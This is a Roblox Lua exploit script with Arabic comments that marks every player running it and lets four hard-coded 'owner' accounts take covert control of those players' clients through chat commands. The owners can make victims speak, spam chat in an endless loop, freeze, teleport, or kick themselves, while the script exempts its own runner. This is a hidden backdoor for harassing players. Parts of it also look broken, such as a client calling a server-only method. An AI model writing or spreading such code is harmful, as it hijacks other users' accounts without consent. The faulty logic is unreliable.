--// سكربت الأونرات النهائي - كل الأوامر من جهاز الزحف نفسه + أنت محصن تمامًا
local Players = game:GetService("Players")
local player = Players.LocalPlayer

player:SetAttribute("ScriptUser", true)

local Owners = {["1il5i"]=true, ["eyad51533"]=true, ["awr_9351156"]=true, ["sj3zx"]=true}

local ChattedEvent = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("ChattedEvent")
local SendMessage   = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendMessage")

-- إرسال أمر سري لجهاز لاعب معين
local function ExecOnTarget(plr, command)
    if plr and plr ~= player and plr:GetAttribute("ScriptUser") then
        game.ReplicatedStorage.Events.RemoteCommandEvent:FireClient(plr, command)
    end
end

-- استقبال الأوامر السرية (من جهازك أو من أي أونر)
game.ReplicatedStorage.Events.RemoteCommandEvent.OnClientEvent:Connect(function(cmd)
    local args = {}
    for word in cmd:gmatch("%S+") do table.insert(args, word) end

    if args[1] == "say" and args[2] then
        table.remove(args, 1)
        SendMessage:FireServer(table.concat(args, " "))

    elseif args[1] == "spam" and args[2] then
        table.remove(args, 1)
        local text = table.concat(args, " ")
        spawn(function()
            while task.wait() do
                SendMessage:FireServer(text)
            end
        end)

    elseif cmd == "freeze" then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local bv = Instance.new("BodyVelocity", player.Character.HumanoidRootPart)
            bv.Velocity = Vector3.new(0,0,0)
            bv.MaxForce = Vector3.new(99999,99999,99999)
            bv.P = 12500
            bv.Name = "OwnerFreeze"
        end
        player:SetAttribute("IsFrozen", true)
        player.CharacterAdded:Connect(function(char)
            task.wait(1)
            if player:GetAttribute("IsFrozen") and char:FindFirstChild("HumanoidRootPart") then
                local bv = Instance.new("BodyVelocity", char.HumanoidRootPart)
                bv.Velocity = Vector3.new(0,0,0)
                bv.MaxForce = Vector3.new(99999,99999,99999)
                bv.P = 12500
                bv.Name = "OwnerFreeze"
            end
        end)

    elseif cmd == "unfreeze" then
        player:SetAttribute("IsFrozen", false)
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local bv = player.Character.HumanoidRootPart:FindFirstChild("OwnerFreeze")
            if bv then bv:Destroy() end
        end

    elseif cmd:sub(1,8) == "bringto_" then
        local targetName = cmd:sub(9)
        local targetPlr = Players:FindFirstChild(targetName)
        if targetPlr and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = targetPlr.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
        end

    elseif cmd == "kickme" then
        player:Kick("تم طردك بواسطة الأونرات")

    end
end)

-- دالة البحث (ما يرجعك أنت أبدًا)
local function findTarget(str)
    if not str or #str < 2 then return nil end
    str = str:lower()
    for _, p in Players:GetPlayers() do
        if p ~= player and p:GetAttribute("ScriptUser") and (p.Name:lower():find(str) or p.DisplayName:lower():find(str)) then
            return p
        end
    end
    return nil
end

ChattedEvent.OnClientEvent:Connect(function(sender, msg)
    if not sender or not Owners[sender.Name] or typeof(msg) ~= "string" then return end

    local lower = msg:lower()
    local args = {}
    for w in msg:gmatch("%S+") do table.insert(args, w) end
    local cmd = args[1] and args[1]:lower() or ""

    -- .say all/يوزر [كلام]
    if cmd == ".say" and #args >= 3 then
        local target = args[2]:lower()
        table.remove(args, 1)
        table.remove(args, 1)
        local text = table.concat(args, " ")
        if target == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") and p ~= player then
                    ExecOnTarget(p, "say " .. text)
                end
            end
        else
            local t = findTarget(args[2])
            if t then ExecOnTarget(t, "say " .. text) end
        end

    -- .spam all/يوزر [كلام]
    elseif cmd == ".spam" and #args >= 3 then
        local target = args[2]:lower()
        table.remove(args, 1)
        table.remove(args, 1)
        local text = table.concat(args, " ")
        if target == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") and p ~= player then
                    ExecOnTarget(p, "spam " .. text)
                end
            end
        else
            local t = findTarget(args[2])
            if t then ExecOnTarget(t, "spam " .. text) end
        end

    -- .freeze all/يوزر
    elseif cmd == ".freeze" then
        local target = args[2] or "all"
        if target == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") and p ~= player then ExecOnTarget(p, "freeze") end
            end
        else
            local t = findTarget(target)
            if t then ExecOnTarget(t, "freeze") end
        end

    -- .unfreeze all/يوزر
    elseif cmd == ".unfreeze" then
        local target = args[2] or "all"
        if target == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") then ExecOnTarget(p, "unfreeze") end
            end
        else
            local t = findTarget(target)
            if t then ExecOnTarget(t, "unfreeze") end
        end

    -- .bring all/يوزر
    elseif cmd == ".bring" then
        local target = args[2] or "all"
        if target == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") and p ~= player then
                    ExecOnTarget(p, "bringto_" .. player.Name)
                end
            end
        else
            local t = findTarget(target)
            if t then ExecOnTarget(t, "bringto_" .. player.Name) end
        end

    -- .kick all/يوزر
    elseif cmd == ".kick" then
        local target = args[2] or "all"
        if target == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") and p ~= player then ExecOnTarget(p, "kickme") end
            end
        else
            local t = findTarget(target)
            if t then ExecOnTarget(t, "kickme") end
        end

    -- .3mk و .f7lk عادي
    elseif lower == ".3mk all" then
        SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحُفُفُ")

    elseif lower:sub(1,5) == ".3mk " then
        local t = findTarget(msg:sub(6))
        if t then
            if player == t then SendMessage:FireServer(".3mk " .. t.DisplayName) end
            SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحُفُفُ")
        end

    elseif lower == ".f7lk" or lower:sub(1,6) == ".f7lk " or lower == ".f7lk all" then
        SendMessage:FireServer("فحًىًلًي @"..sender.DisplayName.."")
    end
end)

print("سكربت الأونرات النهائي - كل شيء من جهاز الزحف + أنت محصن 100%")
